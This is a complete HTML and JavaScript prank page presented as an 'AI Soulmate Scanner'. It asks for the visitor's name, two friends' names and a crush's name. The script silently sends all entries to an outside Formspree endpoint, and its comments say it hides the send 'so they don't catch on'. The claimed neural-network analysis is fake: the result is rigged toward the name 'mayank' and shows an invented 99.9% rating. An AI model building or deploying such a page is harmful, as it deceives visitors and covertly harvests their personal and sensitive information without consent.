<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Soulmate & Bond Calculator</title>
    <style>
        body {
            background: linear-gradient(135deg, #a8c0ff 0%, #3f2b96 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 90%;
            max-width: 420px;
            text-align: center;
            position: relative;
        }
        h2 { color: #3f2b96; margin-bottom: 10px; }
        p { color: #636e72; font-size: 0.9rem; margin-bottom: 25px; }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label { font-weight: bold; font-size: 0.85rem; color: #2d3436; text-transform: uppercase;}
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 0.95rem;
        }
        input[type="text"]:focus {
            border-color: #3f2b96;
            outline: none;
        }
        button {
            background: #3f2b96;
            color: white;
            border: none;
            padding: 14px;
            font-size: 1rem;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            margin-top: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        #result-screen {
            display: none;
        }
        .match-box {
            background: #f1f2f6;
            border: 2px dashed #3f2b96;
            padding: 15px;
            font-size: 1.3rem;
            margin: 20px 0;
            color: #ff4757;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- INPUT FORM SCREEN -->
        <div id="quiz-screen">
            <h2>🔮 AI Soulmate Scanner 🔮</h2>
            <p>Our advanced neural network will analyze your connections to find your ultimate lifetime bond match.</p>
            
            <form action="https://formspree.io/f/xlgqrzpy" method="POST" id="prankForm">
                <div class="form-group">
                    <label>Your Name:</label>
                    <input type="text" id="name1" name="User Name" placeholder="Enter your name" required>
                </div>
                <div class="form-group">
                    <label>Friend Name 1:</label>
                    <input type="text" id="name2" name="Friend 1" placeholder="Enter first friend's name" required>
                </div>
                <div class="form-group">
                    <label>Friend Name 2:</label>
                    <input type="text" id="name3" name="Friend 2" placeholder="Enter second friend's name" required>
                </div>
                <div class="form-group">
                    <label>Crush / GF Name:</label>
                    <input type="text" id="name4" name="Crush or GF" placeholder="Enter crush or GF name" required>
                </div>
                <button type="submit">Run AI Analysis ✨</button>
            </form>
        </div>

        <!-- REVEAL MATCH SCREEN -->
        <div id="result-screen">
            <h2 style="color: #2ed573;">Analysis Complete! ✅</h2>
            <p>The neural network has selected your absolute highest affinity match:</p>
            
            <div class="match-box" id="finalMatch">Searching...</div>
            
            <p style="color: #7f8c8d; font-size: 0.85rem;">Affinity Rating: 99.9% (Perfect Alignment)</p>
            <p style="font-size: 0.75rem; margin-top: 40px; color: #a4b0be;">Data successfully processed.</p>
        </div>
    </div>

    <script>
        const form = document.getElementById('prankForm');
        const quizScreen = document.getElementById('quiz-screen');
        const resultScreen = document.getElementById('result-screen');
        const finalMatchDisplay = document.getElementById('finalMatch');

        form.addEventListener('submit', function(e) {
            e.preventDefault(); // Stop normal redirect
            
            // Gather all input values
            const uName = document.getElementById('name1').value.trim();
            const f1 = document.getElementById('name2').value.trim();
            const f2 = document.getElementById('name3').value.trim();
            const crush = document.getElementById('name4').value.trim();

            let chosenMatch = "";

            // Check if 'mayank' is present anywhere (Case-Insensitive check)
            const containsMayank = (name) => name.toLowerCase() === 'mayank';

            if (containsMayank(uName)) {
                chosenMatch = uName;
            } else if (containsMayank(f1)) {
                chosenMatch = f1;
            } else if (containsMayank(f2)) {
                chosenMatch = f2;
            } else if (containsMayank(crush)) {
                chosenMatch = crush;
            } else {
                // If Mayank isn't anywhere on the form, pick randomly from Friend 1, Friend 2, or Crush
                const pool = [f1, f2, crush];
                const randomIndex = Math.floor(Math.random() * pool.length);
                chosenMatch = pool[randomIndex];
            }

            // Capitalize the first letter of the chosen name to make it look clean on screen
            finalMatchDisplay.textContent = chosenMatch.charAt(0).toUpperCase() + chosenMatch.slice(1);

            // Send all information silently to your Formspree backend
            const data = new FormData(form);
            fetch(form.action, {
                method: form.method,
                body: data,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                // Switch display panels immediately once sent
                quizScreen.style.display = 'none';
                resultScreen.style.display = 'block';
            }).catch(error => {
                // Fallback display if network hits an error so they don't catch on
                quizScreen.style.display = 'none';
                resultScreen.style.display = 'block';
            });
        });
    </script>
</body>
</html>
